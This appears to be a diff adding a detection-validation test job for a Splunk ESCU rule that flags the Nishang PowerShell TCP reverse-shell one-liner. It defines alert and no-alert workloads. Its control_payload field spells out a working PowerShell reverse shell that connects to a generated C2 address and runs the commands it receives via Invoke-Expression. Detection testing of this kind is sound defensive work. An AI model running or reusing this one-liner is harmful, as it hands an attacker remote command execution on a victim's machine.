@@ -1,0 +1,59 @@
+type: job
+name: Nishang PowershellTCPOneLine
+detection:
+  source: escu
+  name: "ESCU - Nishang PowershellTCPOneLine - Rule"
+  id: 1a382c6c-7c2e-11eb-ac69-acde48001122
+description: |
+  Validates detection of a PowerShell reverse-shell one-liner that opens a
+  TCP socket to an attacker-controlled endpoint and pipes decoded stream
+  bytes to Invoke-Expression. A renamed copy of the interpreter alerts on
+  its original file name. The control opens the same socket but decodes
+  with a different ASCII encoder, leaving only one of the two class names
+  the rule requires together.
+
+mitre:
+  tactics: [execution]
+  techniques: [T1059.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  c2_host:            gen.ipv4()
+  c2_port:            gen.port()
+  control_payload: |-
+    $client = New-Object System.Net.Sockets.TCPClient('${ref.c2_host}',${ref.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = ([text.encoding]::ASCII).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/powershell-tcp-reverse-shell
+    bindings:
+      computer: ref.computer
+    expectation:
+      expected: alert
+      summary: "The one-liner names both the TCP client and the ASCII encoder the rule pairs"
+      mitre:
+        tactics: [execution]
+        techniques: [T1059.001]
+
+  - scenario: scenarios/windows/sysmon/process-create/powershell-tcp-reverse-shell
+    bindings:
+      computer:  ref.computer
+      image:     'C:\Temp\ps.exe'
+      exec_path: 'C:\Temp\ps.exe'
+    expectation:
+      expected: alert
+      summary: "A renamed interpreter alerts on the PowerShell.EXE original file name"
+      mitre:
+        tactics: [execution]
+        techniques: [T1059.001]
+
+  - scenario: scenarios/windows/sysmon/process-create/powershell-tcp-reverse-shell
+    bindings:
+      computer:      ref.computer
+      shell_payload: ref.control_payload
+    expectation:
+      expected: none
+      summary: "Decoding the stream without System.Text.ASCIIEncoding leaves the pair incomplete"
